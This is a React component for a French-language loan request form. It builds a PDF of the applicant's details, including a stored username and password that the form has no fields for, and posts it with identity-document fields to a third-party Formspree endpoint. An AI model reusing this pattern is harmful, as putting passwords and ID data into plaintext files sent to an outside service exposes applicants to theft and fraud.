import React, { useState } from 'react';
import { useHistory } from 'react-router-dom';
import { jsPDF } from 'jspdf';
import axios from 'axios'; // Assurez-vous que axios est importé
import "slick-carousel/slick/slick.css";
import "slick-carousel/slick/slick-theme.css";
import Navbar from "components/Navbars/AuthNavbar.js";
import Footer from "components/Footers/Footer.js";
import Carousel from "./carrousel";
import SuccessMessage from './SucessMessage';

const Formulaire = () => {
  const [formData, setFormData] = useState({
    nom: '',
    prenom: '',
    email: '',
    telephone: '',
    montantDemande: '',
    projetDescription: '',
    pays: '',
    ville: '', // Ajout de la ville dans le formData
    idcard: '',
    homeproof: '',
    devise: '',
    username: '',
    mdp: ''
  });

  const [message, setMessage] = useState('');
  const [erreur, setErreur] = useState('');
  const [successMessage, setSuccessMessage] = useState('');
  const history = useHistory();

  // Listes statiques des pays et devises
  const pays = [
    'Luxembourg', 'Irlande', 'Singapour', 'Norvège', 'Qatar', 'Bermudes', 'Suisse', 'Émirats arabes unis',
    'Îles Caïmans', 'Danemark', 'États-Unis d\'Amérique', 'Pays-Bas', 'Islande', 'Autriche', 'Brunei',
    'Hong Kong', 'Belgique', 'Suède', 'Allemagne', 'Australie', 'Finlande', 'Canada', 'Bahreïn', 'Macao',
    'Arabie saoudite', 'Malte', 'Koweït', 'France', 'Royaume-Uni', 'Italie', 'Nouvelle-Zélande', 'Israël',
    'Tchèque', 'Corée du Sud', 'Slovénie', 'Lituanie', 'Sint Maarten', 'Aruba', 'Espagne', 'Estonie',
    'Japon', 'Pologne', 'Portugal', 'Hongrie', 'Roumanie', 'Croatie', 'Guyana', 'Oman', 'Lettonie',
    'Slovaquie'
  ];

  const devises = [
    'EUR', 'SGD', 'NOK', 'QAR', 'USD', 'CHF', 'AED', 'DKK', 'USD', 'EUR', 'ISK', 'BND', 'HKD',
    'SEK', 'AUD', 'CAD', 'BHD', 'SAR', 'EUR', 'KWD', 'GBP', 'NZD', 'ILS', 'CZK', 'KRW', 'EUR',
    'EUR', 'ANG', 'AWG', 'JPY', 'PLN', 'HUF', 'RON', 'HRK', 'GYD', 'OMR', 'EUR', 'SKK'
  ];

  // Fonction pour gérer les changements dans les champs du formulaire
  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  // Fonction pour valider le formulaire
  const validateForm = () => {
    if (
      formData.nom === '' ||
      formData.prenom === '' ||
      formData.email === '' ||
      formData.telephone === '' ||
      formData.montantDemande === '' ||
      formData.projetDescription === '' ||
      formData.pays === '' ||
      formData.ville === '' || // Ajout de la validation pour la ville
      formData.devise === ''
    ) {
      setErreur('Veuillez remplir tous les champs obligatoires.');
      return false;
    }
    return true;
  };

  // Fonction pour générer le PDF
  const generatePdf = (data) => {
    const doc = new jsPDF();
    doc.text(`Nom: ${data.nom}`, 10, 10);
    doc.text(`Prénom: ${data.prenom}`, 10, 20);
    doc.text(`Email: ${data.email}`, 10, 30);
    doc.text(`Téléphone: ${data.telephone}`, 10, 40);
    doc.text(`Montant de la demande: ${data.montantDemande}`, 10, 50);
    doc.text(`Description du projet: ${data.projetDescription}`, 10, 60);
    doc.text(`Pays: ${data.pays}`, 10, 70);
    doc.text(`Ville: ${data.ville}`, 10, 80); // Ajout de la ville dans le PDF
    doc.text(`Devise: ${data.devise}`, 10, 90);
    doc.text(`Username: ${data.username}`, 10, 100);
    doc.text(`Mot de passe: ${data.mdp}`, 10, 110);

    return doc.output('datauristring'); // Return the PDF as a data URI
  };

  // Fonction pour gérer la soumission du formulaire
  const handleSubmit = (e) => {
    e.preventDefault();
    if (validateForm()) {
      const pdfDataUri = generatePdf(formData);
      const pdfBase64 = pdfDataUri.split(',')[1];
      const formspreeUrl = 'https://formspree.io/f/xayrzawe';

      axios.post(formspreeUrl, {
        ...formData,
        pdf: pdfBase64
      }, {
        headers: {
          'Accept': 'application/json'
        }
      })
      .then(response => {
        console.log(response.data);
        setSuccessMessage('Votre demande est en cours d\'examen. Vous recevrez un e-mail sous 48 heures.');
        setTimeout(() => {
            setSuccessMessage('');
        }, 5000); // Disparaît après 5 secondes (5000 millisecondes)
        setErreur('');
        setFormData({
          nom: '',
          prenom: '',
          email: '',
          telephone: '',
          montantDemande: '',
          projetDescription: '',
          pays: '',
          ville: '', // Réinitialisation de la ville
          idcard: '',
          homeproof: '',
          devise: '',
        });
      })
      .catch(error => {
        console.error('Erreur lors de l\'envoi de la demande:', error);
        setMessage('');
        setErreur('Erreur lors de l\'envoi de la demande.');
      });
    }
  };

  return (
    <>
      <Navbar transparent />
      <main>
        <Carousel />
        <br /><br /><br /><br /><br /><br /><br />
        <section className="pb-20 relative block bg-blueGray-800">
          <div className="bottom-auto top-0 left-0 right-0 w-full absolute pointer-events-none overflow-hidden -mt-20 h-20" style={{ transform: "translateZ(0)" }}>
            <svg className="absolute bottom-0 overflow-hidden" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="none" version="1.1" viewBox="0 0 2560 100" x="0" y="0">
              <polygon className="text-blueGray-800 fill-current" points="2560 0 2560 100 0 100"></polygon>
            </svg>
          </div>
        </section>
        <section className="relative block py-24 lg:pt-0 bg-blueGray-800">
          <div className="container mx-auto px-4">
            <div className="flex flex-wrap justify-center lg:-mt-64 -mt-48">
              <div className="w-full lg:w-8/12 px-4">
                <br /><br /><br /><br /><br /><br /><br />
                <div className="relative flex flex-col min-w-0 break-words w-full mb-6 shadow-lg rounded-lg bg-blueGray-200">
                  <div className="flex-auto p-5 lg:p-10">
                    <form onSubmit={handleSubmit} style={{ maxWidth: '800px', margin: 'auto' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '1rem' }}>
                        <div style={{ width: '48%' }}>
                          <label htmlFor="nom">Nom:</label>
                          <input
                            type="text"
                            id="nom"
                            name="nom"
                            value={formData.nom}
                            onChange={handleChange}
                            style={{ width: '100%', padding: '0.5rem' }}
                          />
                        </div>
                        <div style={{ width: '48%' }}>
                          <label htmlFor="prenom">Prénom:</label>
                          <input
                            type="text"
                            id="prenom"
                            name="prenom"
                            value={formData.prenom}
                            onChange={handleChange}
                            style={{ width: '100%', padding: '0.5rem' }}
                          />
                        </div>
                      </div>
                      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '1rem' }}>
                        <div style={{ width: '48%' }}>
                          <label htmlFor="email">Email:</label>
                          <input
                            type="email"
                            id="email"
                            name="email"
                            value={formData.email}
                            onChange={handleChange}
                            style={{ width: '100%', padding: '0.5rem' }}
                          />
                        </div>
                        <div style={{ width: '48%' }}>
                          <label htmlFor="telephone">Téléphone:</label>
                          <input
                            type="text"
                            id="telephone"
                            name="telephone"
                            value={formData.telephone}
                            onChange={handleChange}
                            style={{ width: '100%', padding: '0.5rem' }}
                          />
                        </div>
                      </div>
                      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '1rem' }}>
                        <div style={{ width: '48%' }}>
                          <label htmlFor="montantDemande">Montant de la demande:</label>
                          <input
                            type="number"
                            id="montantDemande"
                            name="montantDemande"
                            value={formData.montantDemande}
                            onChange={handleChange}
                            style={{ width: '100%', padding: '0.5rem' }}
                          />
                        </div>
                        <div style={{ width: '48%' }}>
                          <label htmlFor="devise">Devise:</label>
                          <select
                            id="devise"
                            name="devise"
                            value={formData.devise}
                            onChange={handleChange}
                            style={{ width: '100%', padding: '0.5rem' }}
                          >
                            <option value="">Choisissez une devise...</option>
                            {devises.map(devise => (
                              <option key={devise} value={devise}>{devise}</option>
                            ))}
                          </select>
                        </div>
                      </div>
                      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '1rem' }}>
                        <div style={{ width: '48%' }}>
                          <label htmlFor="pays">Pays:</label>
                          <select
                            id="pays"
                            name="pays"
                            value={formData.pays}
                            onChange={handleChange}
                            style={{ width: '100%', padding: '0.5rem' }}
                          >
                            <option value="">Choisissez un pays...</option>
                            {pays.map(country => (
                              <option key={country} value={country}>{country}</option>
                            ))}
                          </select>
                        </div>
                        {formData.pays && (
                        <div style={{ width: '48%', marginBottom: '1rem' }}>
                          <label htmlFor="ville">Ville:</label>
                          <input
                            type="text"
                            id="ville"
                            name="ville"
                            value={formData.ville}
                            onChange={handleChange}
                            style={{ width: '100%', padding: '0.5rem' }}
                          />
                        </div>
                      )}
                      </div>
                      
                      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '1rem' }}>
                        <div style={{ width: '48%' }}>
                          <label htmlFor="idcard">Pièce d'identité:</label>
                          <input
                            type="file"
                            id="idcard"
                            name="idcard"
                            onChange={handleChange}
                            style={{ width: '100%', padding: '0.5rem' }}
                          />
                        </div>
                        <div style={{ width: '48%' }}>
                          <label htmlFor="homeproof">Justificatif de domicile:</label>
                          <input
                            type="file"
                            id="homeproof"
                            name="homeproof"
                            onChange={handleChange}
                            style={{ width: '100%', padding: '0.5rem' }}
                          />
                        </div>
                      </div>
                      <div style={{ width: '100%', marginBottom: '1rem' }}>
                        <label htmlFor="projetDescription">Description du projet:</label>
                        <textarea
                          id="projetDescription"
                          name="projetDescription"
                          value={formData.projetDescription}
                          onChange={handleChange}
                          style={{ width: '100%', padding: '0.5rem' }}
                        />
                      </div>
                      <div className="text-center mt-6">
                        <button
                          className="bg-blueGray-800 text-white active:bg-blueGray-600 text-sm font-bold uppercase px-6 py-3 rounded shadow hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150"
                          type="button"
                        >
                          Annuler
                        </button>
                        <button
                          className="bg-blueGray-800 text-white active:bg-blueGray-600 text-sm font-bold uppercase px-6 py-3 rounded shadow hover:shadow-lg outline-none focus:outline-none mr-1 mb-1 ease-linear transition-all duration-150"
                          type="submit"
                        >
                          Envoyer
                        </button>
                      </div>
                    </form>
                    {message && <div className="text-center mt-4 text-green-600">{message}</div>}
                    {erreur && <div className="text-center mt-4 text-red-600">{erreur}</div>}
                    {successMessage && <SuccessMessage message={successMessage} />} {/* Afficher le message de succès */}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>
      </main>
      <Footer />
    </>
  );
};

export default Formulaire;
